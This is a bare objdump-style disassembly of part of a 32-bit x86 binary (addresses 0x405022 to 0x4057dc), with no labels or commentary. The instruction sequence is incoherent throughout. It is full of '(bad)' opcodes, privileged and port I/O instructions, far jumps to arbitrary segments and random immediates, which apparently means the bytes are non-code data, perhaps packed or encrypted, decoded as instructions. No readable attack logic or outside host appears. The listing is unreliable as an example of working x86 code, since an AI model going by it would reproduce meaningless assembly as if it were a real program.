  405022:	dec    edi
  405023:	ficomp WORD PTR [esi+0x16ce6d0f]
  405029:	jecxz  0x40502d
  40502b:	popf   
  40502c:	adc    DWORD PTR [edx],ebx
  40502e:	xchg   esi,eax
  40502f:	leave  
  405030:	out    0x41,al
  405032:	inc    ecx
  405033:	popa   
  405034:	cli    
  405035:	ins    DWORD PTR es:[edi],dx
  405036:	mov    ah,0x6a
  405038:	add    cl,BYTE PTR [ebp-0x11]
  40503b:	xor    edx,ebx
  40503d:	pop    esp
  40503e:	(bad)  
  405040:	or     eax,0xf5596d16
  405045:	pop    eax
  405046:	mov    ds:0x3e903ec8,al
  40504b:	cmp    BYTE PTR [ebp-0x6c],bh
  40504e:	outs   dx,DWORD PTR ds:[esi]
  40504f:	cmp    cl,dl
  405051:	mov    cl,0x25
  405053:	std    
  405054:	xor    ch,al
  405056:	popa   
  405057:	jecxz  0x40505e
  405059:	adc    cl,BYTE PTR [ebp+0x51]
  40505c:	test   BYTE PTR [edi+0x48be8b1d],0xc2
  405063:	cmp    esp,esp
  405065:	ins    DWORD PTR es:[edi],dx
  405066:	enter  0x5935,0x5a
  40506a:	pop    esp
  40506b:	imul   ecx,DWORD PTR [edx+0xc],0xb72a622e
  405072:	cs pushf 
  405074:	outs   dx,DWORD PTR ds:[esi]
  405075:	sub    al,0xbe
  405077:	pop    es
  405078:	sub    al,0xd8
  40507a:	cld    
  40507b:	shl    DWORD PTR [eax-0x6917fdfa],1
  405081:	cmc    
  405082:	xchg   edx,eax
  405083:	aaa    
  405084:	repz add DWORD PTR [ecx+0x56],edi
  405088:	pop    ds
  405089:	dec    edx
  40508a:	sub    BYTE PTR [ecx],bl
  40508c:	pop    ebp
  40508d:	arpl   WORD PTR [esi-0x71],dx
  405090:	sub    al,0x9a
  405092:	mov    ah,ch
  405094:	stc    
  405095:	add    al,0x59
  405097:	push   edx
  405098:	jnp    0x40501f
  40509a:	lahf   
  40509b:	jge    0x40504e
  40509d:	adc    edi,DWORD PTR [ebx]
  40509f:	mov    edx,0x1a0f8eb9
  4050a4:	jecxz  0x405100
  4050a6:	call   0x25eeda4b
  4050ab:	mul    DWORD PTR [edx]
  4050ad:	jae    0x4050c0
  4050af:	aam    0x2f
  4050b1:	sub    eax,0x85467769
  4050b6:	mov    ebx,0x3cd1a11a
  4050bb:	inc    esi
  4050bc:	sti    
  4050bd:	mov    esi,0x94789c0b
  4050c2:	hlt    
  4050c3:	test   DWORD PTR [eax],edx
  4050c5:	test   al,0x75
  4050c7:	sub    ah,BYTE PTR [esi-0xf]
  4050ca:	rcl    BYTE PTR [edi+0x61],1
  4050cd:	or     BYTE PTR [ebp-0x6d],bh
  4050d0:	sbb    al,0x8
  4050d2:	push   edi
  4050d3:	add    eax,0x48cdf30f
  4050d8:	mov    DWORD PTR [ebp-0x2f7ef634],esi
  4050de:	sbb    eax,0x6b00bbe3
  4050e3:	add    ebx,esi
  4050e5:	inc    ebx
  4050e6:	enter  0x1843,0xa9
  4050ea:	int    0x3e
  4050ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050ed:	pop    ebp
  4050ee:	out    dx,eax
  4050ef:	aad    0x8
  4050f1:	xor    al,0xe2
  4050f3:	mov    edi,0x8f8bc2aa
  4050f8:	pop    ebx
  4050f9:	add    DWORD PTR [eax],edi
  4050fb:	ficom  WORD PTR [eax-0x6c7a8e3a]
  405101:	mov    DWORD PTR [ebx+eiz*4-0x71f6d714],esp
  405108:	mov    dl,0x9c
  40510a:	out    dx,eax
  40510b:	repnz mov ebx,0x8c9087a
  405111:	fsubrp st(0),st
  405113:	(bad)  
  405114:	je     0x40515f
  405116:	add    dh,0xbe
  405119:	inc    ecx
  40511a:	mov    ch,0x9c
  40511c:	imul   ebp,DWORD PTR [edi+0x16ecce3f],0x65
  405123:	jae    0x4050b6
  405125:	push   es
  405126:	cwde   
  405127:	loop   0x4050f6
  405129:	nop
  40512a:	and    esp,ecx
  40512c:	daa    
  40512d:	xor    eax,0xd5d8146e
  405132:	mov    esi,0xd31ad786
  405137:	iret   
  405138:	not    ecx
  40513a:	push   ds
  40513b:	test   BYTE PTR [edx+ecx*1-0x6436e0d9],bl
  405142:	dec    ecx
  405143:	in     eax,dx
  405144:	fst    DWORD PTR ds:0x3f6c1afc
  40514a:	out    dx,al
  40514b:	(bad)  
  40514c:	mov    esp,0x6f9a5183
  405151:	aam    0xa3
  405153:	jl     0x40519d
  405155:	dec    esp
  405156:	push   es
  405157:	leave  
  405158:	test   DWORD PTR [edx],esp
  40515a:	jne    0x4051cb
  40515c:	aaa    
  40515d:	call   0x555e:0xc01228a0
  405164:	sub    dh,BYTE PTR [edx]
  405166:	and    al,0xea
  405168:	clc    
  405169:	je     0x40519d
  40516b:	into   
  40516c:	inc    edi
  40516d:	inc    esi
  40516e:	pushf  
  40516f:	cmp    edx,DWORD PTR [ebp+0x3b]
  405172:	arpl   WORD PTR [edx+0x31dc1f13],ax
  405178:	cmp    DWORD PTR [esi-0x1a],ebp
  40517b:	pop    ebp
  40517c:	push   0x9606fd1c
  405181:	cmc    
  405182:	push   ds
  405183:	mul    DWORD PTR [esi]
  405185:	mov    ebp,0xb19f9cb9
  40518a:	or     bh,BYTE PTR [edx]
  40518c:	sbb    BYTE PTR [esi-0x6e],al
  40518f:	std    
  405190:	inc    edi
  405191:	fwait
  405192:	sub    BYTE PTR [edi-0x3],dl
  405195:	arpl   WORD PTR [ecx],si
  405197:	ret    0xed40
  40519a:	add    dl,BYTE PTR [ebx-0x6242d8cf]
  4051a0:	rcr    BYTE PTR [edi],cl
  4051a2:	imul   esi,DWORD PTR ds:0x435f143d,0x6b
  4051a9:	ds sub al,0xec
  4051ac:	pop    es
  4051ad:	mov    eax,0xd92c910f
  4051b2:	add    bh,BYTE PTR ds:0xa075b309
  4051b8:	jno    0x4051e7
  4051ba:	inc    eax
  4051bb:	or     ebp,DWORD PTR [esi]
  4051bd:	int    0x13
  4051bf:	sub    ebp,DWORD PTR [ebp+edi*4+0x4d0cc3a4]
  4051c6:	sbb    bh,dl
  4051c8:	aaa    
  4051c9:	fwait
  4051ca:	retf   
  4051cb:	pop    edx
  4051cc:	fistp  WORD PTR [ebx]
  4051ce:	and    al,0x49
  4051d0:	push   0xffffffb8
  4051d2:	ror    al,0x29
  4051d5:	jo     0x405241
  4051d7:	sbb    dl,BYTE PTR [esi-0x71]
  4051da:	(bad)  
  4051dc:	scas   eax,DWORD PTR es:[edi]
  4051dd:	mov    dh,0x14
  4051df:	mov    dh,0xdd
  4051e1:	loope  0x405258
  4051e3:	or     ch,BYTE PTR [ecx+ebp*2]
  4051e6:	push   esp
  4051e7:	jg     0x4051fd
  4051e9:	inc    DWORD PTR [eax-0x3e17944c]
  4051ef:	stos   DWORD PTR es:[edi],eax
  4051f0:	cmp    BYTE PTR [esi],ah
  4051f2:	test   al,0x24
  4051f4:	popa   
  4051f5:	icebp  
  4051f6:	inc    esi
  4051f7:	retf   
  4051f8:	xlat   BYTE PTR ds:[ebx]
  4051f9:	sahf   
  4051fa:	pop    ds
  4051fb:	sbb    DWORD PTR [esi+0x3f],esp
  4051fe:	wrmsr  
  405200:	lea    esi,[ebp-0x46]
  405203:	xchg   BYTE PTR [eax],cl
  405205:	mov    ah,0xce
  405207:	sbb    DWORD PTR cs:[ecx-0xf857e76],0x390c18c5
  405212:	sbb    al,0xf5
  405214:	inc    ebp
  405215:	and    ecx,0xffffffa0
  405218:	stos   BYTE PTR es:[edi],al
  405219:	push   esi
  40521a:	retf   
  40521b:	inc    dx
  40521d:	add    BYTE PTR [ebx+ebp*8-0x2b0f28fa],0x41
  405225:	lods   al,BYTE PTR ds:[esi]
  405226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405227:	ds repnz icebp 
  40522a:	mov    ecx,0xd165a409
  40522f:	in     al,dx
  405230:	lahf   
  405231:	repz push edi
  405233:	sbb    eax,0x5026947f
  405238:	cli    
  405239:	sub    eax,0xae9f2204
  40523e:	fidivr DWORD PTR [edi-0x3329602]
  405244:	cmp    esp,DWORD PTR [esi+0x59]
  405247:	dec    esp
  405248:	leave  
  405249:	hlt    
  40524a:	cmp    al,0x26
  40524c:	dec    esi
  40524d:	pop    edi
  40524e:	push   ds
  40524f:	mov    bh,dl
  405251:	jecxz  0x405270
  405253:	jmp    0xdfaa:0x50805ccc
  40525a:	adc    ch,dh
  40525c:	(bad)  
  40525d:	mov    ecx,0x6d4488ff
  405262:	leave  
  405263:	xchg   ebx,eax
  405264:	dec    ebp
  405265:	ins    BYTE PTR es:[edi],dx
  405266:	cmp    BYTE PTR [ebp-0x5a574844],dl
  40526c:	xor    DWORD PTR [ebp-0x60],0xffffffe8
  405270:	popa   
  405271:	je     0x4052ee
  405273:	sbb    al,0x82
  405275:	and    al,0x2a
  405277:	pusha  
  405278:	sub    eax,0xd989ef93
  40527d:	pop    ss
  40527e:	mov    bh,BYTE PTR [ebx]
  405280:	mov    ds,WORD PTR [ebp-0x226f9494]
  405286:	pop    ds
  405287:	outs   dx,DWORD PTR ds:[esi]
  405288:	out    0x37,eax
  40528a:	in     al,0xc8
  40528c:	out    0x1a,eax
  40528e:	lock xchg DWORD PTR [bp+si-0x2464],ecx
  405294:	mov    cl,0xa6
  405296:	sbb    eax,0x494baf13
  40529b:	or     al,0x88
  40529d:	push   0x9
  40529f:	add    DWORD PTR [edi+0x3e],0xffffffc2
  4052a3:	jno    0x4052ec
  4052a5:	sbb    eax,0x57d8595
  4052aa:	shr    DWORD PTR [ebx+0x4e],cl
  4052ad:	mov    ds:0xbd2176f9,eax
  4052b2:	mov    ebx,0x561d33b8
  4052b7:	jg     0x4052e1
  4052b9:	fistp  WORD PTR [ecx]
  4052bb:	push   0xbc5953ac
  4052c0:	iret   
  4052c1:	push   ebx
  4052c2:	fwait
  4052c3:	ret    0xc492
  4052c6:	pop    edi
  4052c7:	push   0xca654669
  4052cc:	dec    esp
  4052cd:	inc    ebx
  4052ce:	push   eax
  4052cf:	lock or BYTE PTR [ebx],ch
  4052d2:	mov    ds:0x8474d1f1,al
  4052d7:	mov    ds:0xde16a6af,al
  4052dc:	repnz rcl DWORD PTR [esi-0x4f],1
  4052e0:	jne    0x405303
  4052e2:	cmp    cl,BYTE PTR [ebp-0x2f39f2d9]
  4052e8:	es and al,0x91
  4052eb:	out    0xa0,eax
  4052ed:	cmp    ecx,DWORD PTR [edx]
  4052ef:	ins    DWORD PTR es:[edi],dx
  4052f0:	push   edi
  4052f1:	xchg   ecx,eax
  4052f2:	jmp    0x773:0xd3c80f79
  4052f9:	cwde   
  4052fa:	cmp    ah,ch
  4052fc:	push   ecx
  4052fd:	nop
  4052fe:	mov    dh,0x3c
  405300:	add    al,0x74
  405302:	in     eax,dx
  405303:	cmp    ch,BYTE PTR [eax-0x3b]
  405306:	daa    
  405307:	mov    bl,0xf3
  405309:	sub    al,0xeb
  40530b:	out    dx,eax
  40530c:	stos   DWORD PTR es:[edi],eax
  40530d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40530e:	jle    0x405360
  405310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405311:	loop   0x4052d5
  405313:	push   ecx
  405314:	fistp  QWORD PTR [esi+0x72]
  405317:	add    DWORD PTR [edx+0x64],ebx
  40531a:	cdq    
  40531b:	fdiv   DWORD PTR [esi+0x41670b00]
  405321:	(bad)  
  405322:	(bad)  [esi]
  405324:	jno    0x405334
  405326:	clc    
  405327:	(bad)  
  405328:	fcmovnb st,st(1)
  40532a:	nop
  40532b:	xor    cl,dl
  40532d:	dec    ebx
  40532e:	add    ah,BYTE PTR [eax-0x6b]
  405331:	js     0x4052eb
  405333:	push   ebp
  405334:	or     bh,BYTE PTR [ebx+0x19d815b6]
  40533a:	gs daa 
  40533c:	outs   dx,DWORD PTR ds:[esi]
  40533d:	sub    eax,0x87392bb2
  405342:	retf   0xfe54
  405345:	cmp    esp,DWORD PTR [ecx-0x37f4ae1]
  40534b:	or     eax,0x48ac5527
  405350:	ins    DWORD PTR es:[edi],dx
  405351:	adc    eax,0x36d60f3c
  405356:	xchg   ebp,eax
  405357:	ja     0x40536b
  405359:	push   cs
  40535a:	ja     0x40537c
  40535c:	sbb    eax,0xbab9aa53
  405361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405362:	(bad)  
  405363:	retf   0xf8b3
  405366:	out    0xe,al
  405368:	shl    BYTE PTR ds:[ebp-0x57d98f03],cl
  40536f:	mov    bl,0xa1
  405371:	or     DWORD PTR [eax-0x62],ebx
  405374:	xchg   edx,eax
  405375:	add    esi,ebx
  405377:	dec    esp
  405378:	(bad)  [edi+0xc]
  40537b:	dec    ecx
  40537c:	(bad)  
  40537d:	cmp    eax,0x63405ef1
  405382:	mov    esi,0xe0caf504
  405387:	loope  0x40536c
  405389:	mov    eax,ds:0xe0190a41
  40538e:	inc    esp
  40538f:	test   DWORD PTR fs:[esp+esi*1-0x596f1068],eax
  405397:	pop    es
  405398:	and    ch,cl
  40539a:	call   0xc133fb03
  40539f:	shr    bl,0xa
  4053a2:	in     eax,0x9b
  4053a4:	and    DWORD PTR [ebx],edx
  4053a6:	mov    DWORD PTR [esi+eiz*1+0x57],ebp
  4053aa:	sbb    DWORD PTR [esi+0xaefffdc],edi
  4053b0:	in     al,dx
  4053b1:	in     al,dx
  4053b2:	mov    ds:0x8a9171fb,eax
  4053b7:	xor    al,0xb9
  4053b9:	xchg   edx,eax
  4053ba:	cmp    dh,BYTE PTR [edx]
  4053bc:	push   ecx
  4053bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053be:	lahf   
  4053bf:	push   esi
  4053c0:	mov    edi,0x413bc2ef
  4053c5:	cmp    BYTE PTR [edx-0x2b840127],al
  4053cb:	mov    DWORD PTR [edi-0x28],ecx
  4053ce:	jnp    0x4053be
  4053d0:	sar    BYTE PTR [ecx+0xebb417c],0xbe
  4053d7:	push   esp
  4053d8:	mov    esi,0xc311ad12
  4053dd:	hlt    
  4053de:	dec    edx
  4053df:	push   edx
  4053e0:	inc    eax
  4053e1:	and    bh,BYTE PTR [edi+0x2ac23603]
  4053e7:	(bad)  
  4053e8:	jnp    0x40539b
  4053ea:	cmp    eax,0xc21a0948
  4053ef:	dec    edx
  4053f0:	mov    ecx,0xb7893da5
  4053f5:	xor    esi,esi
  4053f7:	or     DWORD PTR [ecx-0x36],eax
  4053fa:	(bad)  
  4053fb:	dec    edi
  4053fc:	jmp    0x40539e
  4053fe:	mov    fs,WORD PTR [ebx]
  405400:	cs out dx,eax
  405402:	jae    0x4053f8
  405404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405405:	retf   
  405406:	or     eax,0x863519d2
  40540b:	pop    es
  40540c:	jo     0x405410
  40540e:	fsubr  QWORD PTR [ecx+0x2d91d662]
  405414:	jb     0x40540a
  405416:	je     0x40545b
  405418:	push   ds
  405419:	lock mov ah,0xfe
  40541c:	fimul  WORD PTR [ebx]
  40541e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40541f:	inc    edi
  405420:	popa   
  405421:	je     0x40544e
  405423:	sub    al,0x12
  405425:	bound  ebx,QWORD PTR [esi]
  405427:	or     al,0xe8
  405429:	mov    dh,0x73
  40542b:	std    
  40542c:	jne    0x405420
  40542e:	int    0x7e
  405430:	loopne 0x405441
  405432:	test   cl,bl
  405434:	mov    ah,0xe9
  405436:	test   eax,0x830092cc
  40543b:	fsubr  DWORD PTR [ebx+0x68]
  40543e:	stos   BYTE PTR es:[edi],al
  40543f:	dec    edx
  405440:	xor    eax,0xa53fcee4
  405445:	inc    edx
  405446:	add    DWORD PTR [ebp-0x4b58325b],0x3cdce971
  405450:	sub    edx,DWORD PTR [esi+0x6e1b43f5]
  405456:	fsubr  st(2),st
  405458:	mov    WORD PTR [eax],es
  40545a:	mov    dh,0xe9
  40545c:	int3   
  40545d:	sbb    eax,0xe2dd3dc
  405462:	les    ebp,FWORD PTR [ebx+0xc]
  405465:	test   BYTE PTR [esi+0x42],0x9b
  405469:	push   0x3cc4b5fc
  40546e:	iret   
  40546f:	lds    eax,FWORD PTR ds:0xcac32ce9
  405475:	rol    ch,0x18
  405478:	cmp    eax,0xca931dba
  40547d:	cli    
  40547e:	repnz fs or eax,ecx
  405482:	pop    edi
  405483:	int    0x6f
  405485:	mov    bh,0x6c
  405487:	loop   0x405410
  405489:	aaa    
  40548a:	fimul  WORD PTR [edi+eax*8-0x418bdbe5]
  405491:	jge    0x40544d
  405493:	lods   eax,DWORD PTR ds:[esi]
  405494:	inc    ecx
  405495:	out    dx,eax
  405496:	(bad)  
  405497:	push   ss
  405498:	gs fs push esp
  40549b:	fidiv  DWORD PTR [esi+0x7]
  40549e:	jns    0x4054ca
  4054a0:	push   0x7f492814
  4054a5:	adc    DWORD PTR [eax-0x7],eax
  4054a8:	rcr    DWORD PTR [edi-0x10],cl
  4054ab:	(bad)  
  4054ac:	mov    eax,ds:0x49da9816
  4054b1:	retf   0xf4a7
  4054b4:	and    eax,DWORD PTR [ebp+0x1825fd70]
  4054ba:	in     al,dx
  4054bb:	in     eax,0x79
  4054bd:	shr    DWORD PTR [eax+ecx*1-0x33],0x4b
  4054c2:	add    ebx,DWORD PTR [edx]
  4054c4:	mov    bl,0x9e
  4054c6:	sar    dl,1
  4054c8:	lahf   
  4054c9:	inc    edi
  4054ca:	mov    esi,0x851fbddf
  4054cf:	adc    DWORD PTR [edi+0x3323eb79],ebp
  4054d5:	popf   
  4054d6:	cdq    
  4054d7:	fstp   st(1)
  4054d9:	push   es
  4054da:	sub    dh,BYTE PTR [esi]
  4054dc:	cmp    DWORD PTR [esi-0x27],esi
  4054df:	aaa    
  4054e0:	sub    DWORD PTR [edi],0xffffffc9
  4054e3:	std    
  4054e4:	pop    ecx
  4054e5:	sub    DWORD PTR [ecx],ebx
  4054e7:	jg     0x4054db
  4054e9:	mov    ebp,0xb1993d3d
  4054ee:	fucomip st,st(4)
  4054f0:	das    
  4054f1:	cmp    BYTE PTR [ecx],bh
  4054f3:	pop    esp
  4054f4:	jge    0x4054f5
  4054f6:	in     eax,dx
  4054f7:	adc    al,dh
  4054f9:	mov    ah,0xa1
  4054fb:	jmp    0x405538
  4054fd:	stos   BYTE PTR es:[edi],al
  4054fe:	mov    esp,0x369d4850
  405503:	xor    al,0xf2
  405505:	mov    ah,0xcf
  405507:	push   0xfffffff6
  405509:	in     eax,0xa
  40550b:	or     DWORD PTR [esp+edx*2],edx
  40550e:	mov    es,esi
  405510:	cs xchg cl,cl
  405513:	outs   dx,BYTE PTR ds:[esi]
  405514:	xchg   edi,eax
  405515:	sar    ah,1
  405517:	xor    cx,di
  40551a:	(bad)  
  40551b:	xchg   edx,eax
  40551c:	call   0xab8ba0f4
  405521:	test   eax,0x406c7e57
  405526:	fsubr  QWORD PTR [eax]
  405528:	ja     0x4054f9
  40552a:	clc    
  40552b:	pop    ebp
  40552c:	out    0x57,al
  40552e:	sub    eax,0x690a1f0f
  405533:	scas   al,BYTE PTR es:[edi]
  405534:	pop    ecx
  405535:	xor    BYTE PTR [ebp+0x61],dl
  405538:	adc    edi,DWORD PTR [esi+0x627cdf24]
  40553e:	retf   0x48af
  405541:	mov    ebp,DWORD PTR [edi+0x77]
  405544:	dec    eax
  405545:	adc    DWORD PTR [edi+0x26],edx
  405548:	outs   dx,DWORD PTR ds:[esi]
  405549:	xchg   ebp,eax
  40554a:	sbb    al,0x25
  40554c:	inc    ebp
  40554d:	jg     0x405524
  40554f:	lods   al,BYTE PTR ds:[esi]
  405550:	jl     0x40551c
  405552:	pop    esi
  405553:	mov    bl,BYTE PTR [ebx]
  405555:	lock mov bl,0x8e
  405558:	mov    esp,ss
  40555a:	fcom   st(6)
  40555c:	jl     0x4054fb
  40555e:	cmc    
  40555f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405560:	sub    al,0xc9
  405562:	sahf   
  405563:	xlat   BYTE PTR ds:[ebx]
  405564:	ficom  DWORD PTR [ebp-0x15ce301b]
  40556a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40556b:	scas   eax,DWORD PTR es:[edi]
  40556c:	mov    eax,0xeefda1b0
  405571:	xor    ch,al
  405573:	iret   
  405574:	loopne 0x4055e7
  405576:	add    dl,cl
  405578:	push   ds
  405579:	pop    eax
  40557a:	pusha  
  40557b:	inc    ecx
  40557c:	mov    WORD PTR [ebx*4-0x38f351a1],cs
  405583:	scas   al,BYTE PTR es:[edi]
  405584:	pop    DWORD PTR [ebx-0x17662f07]
  40558a:	push   ds
  40558b:	dec    esi
  40558c:	out    0xcb,eax
  40558e:	aam    0xa7
  405590:	xlat   BYTE PTR ds:[ebx]
  405591:	pop    ecx
  405592:	add    DWORD PTR ds:0xaa08d39a,esi
  405598:	retf   0x9e24
  40559b:	sub    dl,ch
  40559d:	cmp    BYTE PTR [edx+0x13763fe5],dl
  4055a3:	adc    eax,0xe0eee47d
  4055a8:	xlat   BYTE PTR ds:[ebx]
  4055a9:	loope  0x4055c3
  4055ab:	push   edi
  4055ac:	dec    esp
  4055ad:	cli    
  4055ae:	in     al,dx
  4055af:	mov    ebp,0xf777534f
  4055b4:	cli    
  4055b5:	es xchg edi,eax
  4055b7:	pop    es
  4055b8:	cs push esp
  4055ba:	(bad)  
  4055bb:	jle    0x405592
  4055bd:	inc    esp
  4055be:	jae    0x40555d
  4055c0:	stos   BYTE PTR es:[edi],al
  4055c1:	xchg   esi,eax
  4055c2:	xchg   ebp,eax
  4055c3:	stos   DWORD PTR es:[edi],eax
  4055c4:	mov    ch,0xe0
  4055c6:	mov    ds:0x91234286,al
  4055cb:	cmp    al,0xc4
  4055cd:	cmp    BYTE PTR [eax+0x45],bh
  4055d0:	push   0xce333284
  4055d5:	pop    esi
  4055d6:	lods   eax,DWORD PTR ds:[esi]
  4055d7:	icebp  
  4055d8:	ret    0x7600
  4055db:	xor    al,0x21
  4055dd:	mov    edx,DWORD PTR [ecx+0x58]
  4055e0:	mov    cl,0x54
  4055e2:	nop
  4055e3:	add    eax,0x1ed14877
  4055e8:	sti    
  4055e9:	not    edi
  4055eb:	nop
  4055ec:	clc    
  4055ed:	call   0xbcc:0xc394ae58
  4055f4:	fisttp QWORD PTR [ebp+0x49]
  4055f7:	sub    ebp,esp
  4055f9:	sahf   
  4055fa:	sbb    eax,0xa2f5a441
  4055ff:	popa   
  405600:	pop    ecx
  405601:	cmp    BYTE PTR [esi+0x4f5be498],bl
  405607:	out    dx,al
  405608:	cmp    eax,0xe71a5a2e
  40560d:	dec    edx
  40560e:	sbb    ebx,ecx
  405610:	fscale 
  405612:	mov    ebp,0xef2e9abd
  405617:	loope  0x405665
  405619:	mov    ecx,0x35c4f24f
  40561e:	push   es
  40561f:	fcmovbe st,st(6)
  405621:	mov    edi,0x4a0ae4bd
  405626:	or     al,0x44
  405628:	or     eax,0x3dc6054
  40562d:	cwde   
  40562e:	push   es
  40562f:	pop    es
  405630:	sub    eax,DWORD PTR [ecx]
  405632:	in     eax,0x52
  405634:	out    dx,eax
  405635:	adc    al,0x13
  405637:	icebp  
  405638:	ret    0xea82
  40563b:	ror    BYTE PTR [eax-0x36],1
  40563e:	icebp  
  40563f:	mov    dl,0xa8
  405641:	jne    0x4055d0
  405643:	mov    edx,ebp
  405645:	and    eax,0xe45bb8a6
  40564a:	repz (bad) 
  40564c:	es retf 
  40564e:	mov    edx,0x5d9e2694
  405653:	mov    ebp,0xa53ca6f
  405658:	pop    ecx
  405659:	jbe    0x4056a9
  40565b:	fmul   DWORD PTR [edx+0x6a]
  40565e:	in     al,0xd4
  405660:	mov    dl,0x46
  405662:	loope  0x405686
  405664:	sub    BYTE PTR [eax-0x184cf305],bh
  40566a:	or     ebp,edi
  40566c:	ret    0x2879
  40566f:	arpl   cx,di
  405671:	fst    st(0)
  405673:	adc    al,0xa0
  405675:	inc    esp
  405676:	mov    eax,0x8473948
  40567b:	pop    eax
  40567c:	test   al,0x5d
  40567e:	cwde   
  40567f:	aam    0x71
  405681:	popa   
  405682:	mov    ch,BYTE PTR [edi]
  405684:	mov    edi,0xdae8da3a
  405689:	lods   al,BYTE PTR ds:[esi]
  40568a:	adc    al,0x8d
  40568c:	nop
  40568d:	mov    edi,0xa403ede3
  405692:	jo     0x40570a
  405694:	mov    bh,BYTE PTR [edx+0x3e49a1f4]
  40569a:	jmp    0x7682c2ba
  40569f:	cmc    
  4056a0:	scas   eax,DWORD PTR es:[edi]
  4056a1:	out    dx,al
  4056a2:	outs   dx,DWORD PTR ds:[esi]
  4056a3:	ja     0x4056b6
  4056a5:	push   0x33
  4056a7:	arpl   cx,bp
  4056a9:	je     0x4056a8
  4056ab:	jmp    0x90a7e57d
  4056b0:	ins    DWORD PTR es:[edi],dx
  4056b1:	test   dh,0x80
  4056b4:	in     eax,0xca
  4056b6:	push   ecx
  4056b7:	inc    eax
  4056b8:	mov    ds:0xe37667f6,eax
  4056bd:	callw  0x43cd
  4056c1:	int    0x51
  4056c3:	(bad)  
  4056c4:	lock imul bh
  4056c7:	mov    esp,0xdde84294
  4056cc:	jmp    0x4056e6
  4056ce:	pop    ds
  4056cf:	sar    BYTE PTR [edx],1
  4056d1:	push   es
  4056d2:	mov    cl,dl
  4056d4:	jo     0x405726
  4056d6:	inc    ecx
  4056d7:	fdivrp st(1),st
  4056d9:	push   ds
  4056da:	push   eax
  4056db:	cld    
  4056dc:	popa   
  4056dd:	inc    esp
  4056de:	nop
  4056df:	(bad)  
  4056e0:	cld    
  4056e1:	jmp    0x405752
  4056e3:	mov    ds:0xc045b75e,al
  4056e8:	fimul  DWORD PTR [eax-0x5b]
  4056eb:	lahf   
  4056ec:	jns    0x4056a7
  4056ee:	pop    esi
  4056ef:	stos   BYTE PTR es:[edi],al
  4056f0:	sbb    BYTE PTR [ebp-0x6dd04d98],bl
  4056f6:	rcr    DWORD PTR [edi],1
  4056f8:	(bad)  [esi-0xb5fc859]
  4056fe:	scas   eax,DWORD PTR es:[edi]
  4056ff:	scas   al,BYTE PTR es:[edi]
  405700:	pop    ss
  405701:	fwait
  405702:	sub    ecx,edi
  405704:	or     ah,bl
  405706:	mov    ds:0x953e6375,eax
  40570b:	(bad)  
  40570c:	jno    0x4056c1
  40570e:	mov    eax,ds:0xe6442aa4
  405713:	mov    esp,edi
  405715:	pusha  
  405716:	cmp    DWORD PTR ds:0x9d069f6b,eax
  40571c:	push   es
  40571d:	(bad)  
  40571e:	xlat   BYTE PTR ds:[ebx]
  40571f:	iret   
  405720:	cld    
  405721:	jp     0x4056d6
  405723:	add    eax,0x82edaec0
  405728:	push   esi
  405729:	and    eax,eax
  40572b:	or     al,0x6d
  40572d:	aam    0xd
  40572f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405730:	xor    BYTE PTR ds:0xe7e224c0,dh
  405736:	pop    ebx
  405737:	jg     0x4056e2
  405739:	stos   DWORD PTR es:[edi],eax
  40573a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40573b:	cli    
  40573c:	sub    esp,DWORD PTR [esi+0x76]
  40573f:	addr16 pop ebx
  405741:	xchg   ebx,eax
  405742:	retf   
  405743:	jae    0x4057a5
  405745:	int3   
  405746:	jne    0x405767
  405748:	(bad)  
  40574a:	adc    eax,0x2ceb656e
  40574f:	iret   
  405750:	test   al,0xb4
  405753:	fbld   TBYTE PTR [ebx+0x24360f8f]
  405759:	mov    edi,0xd006b6bf
  40575e:	scas   eax,DWORD PTR es:[edi]
  40575f:	jg     0x405759
  405761:	dec    eax
  405762:	inc    edx
  405763:	ret    0xbd3a
  405766:	pop    esp
  405767:	clc    
  405768:	mov    bh,0xd6
  40576a:	mov    ecx,DWORD PTR [ecx-0x197d8016]
  405770:	xchg   esp,eax
  405771:	addr16 pop ss
  405773:	fisttp DWORD PTR [edi]
  405775:	aaa    
  405776:	mov    esp,0xc2be2db1
  40577b:	inc    eax
  40577c:	bound  edx,QWORD PTR [esi+0x3d]
  40577f:	stc    
  405780:	jmp    0x6339:0x68067ee0
  405787:	and    bl,BYTE PTR [ecx]
  405789:	into   
  40578a:	mov    esi,0xbb82cf1f
  40578f:	lods   eax,DWORD PTR ds:[esi]
  405790:	xlat   BYTE PTR ds:[ebx]
  405791:	test   al,0xcc
  405793:	jl     0x4057d8
  405795:	dec    ecx
  405796:	pusha  
  405797:	push   0x14
  405799:	push   ds
  40579a:	push   eax
  40579b:	xchg   esi,ebx
  40579d:	inc    edi
  40579e:	jl     0x40578a
  4057a0:	push   ds
  4057a1:	push   cs
  4057a2:	scas   al,BYTE PTR es:[edi]
  4057a3:	stos   BYTE PTR es:[edi],al
  4057a4:	push   edx
  4057a5:	mov    cs,WORD PTR [ebx+0x52aae61d]
  4057ab:	hlt    
  4057ac:	sti    
  4057ad:	inc    edx
  4057ae:	xchg   DWORD PTR [edi],ecx
  4057b0:	fsubr  DWORD PTR [ecx]
  4057b2:	jmp    0xbc35:0x8b45c21b
  4057b9:	pop    eax
  4057ba:	inc    ebx
  4057bb:	outs   dx,DWORD PTR ds:[esi]
  4057bc:	lods   eax,DWORD PTR ds:[esi]
  4057bd:	jb     0x405753
  4057bf:	mov    esp,0xeb7cd87b
  4057c4:	ret    0xf1d3
  4057c7:	push   eax
  4057c8:	cdq    
  4057c9:	js     0x4057f3
  4057cb:	mov    bl,0x61
  4057cd:	sub    DWORD PTR [edi],0xffffffcb
  4057d0:	iret   
  4057d1:	push   edx
  4057d2:	lock loope 0x405815
  4057d5:	jmp    FWORD PTR [edx+0x14]
  4057d8:	shl    bl,cl
  4057da:	cmp    al,0x8c
  4057dc:	repnz dec esp
